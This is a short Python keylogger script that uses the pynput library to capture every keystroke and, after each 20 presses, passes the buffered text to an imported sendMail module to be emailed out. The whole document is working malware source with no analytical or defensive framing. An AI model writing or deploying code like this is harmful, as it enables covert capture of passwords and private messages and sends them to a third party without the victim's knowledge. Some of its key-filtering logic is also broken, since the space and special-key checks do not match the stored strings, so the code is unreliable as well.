import pynput
from pynput.keyboard import Key, Listener
import sendMail

count = 0
keys = []

def onPressed(key):
    print(key, end=' ')
    print('Pressed ')
    global keys, count
    keys.append(str(key) + '\n')
    count += 1
    if count > 20:
        count = 0
        email(keys)
        
def email(keys):
    msg = ''
    for key in keys:
        k = key.replace("'", "")
        if key == 'Key.space':
            k = ' '
        elif key.find('Key') > 0:
            k = ''
        msg += k
    print(msg)
    sendMail.sendMail(msg)
    
def onReleased(key):
    if key == Key.esc:
        return False
    
    
with Listener(on_press=onPressed, on_release=onReleased) as listener:
    listener.join()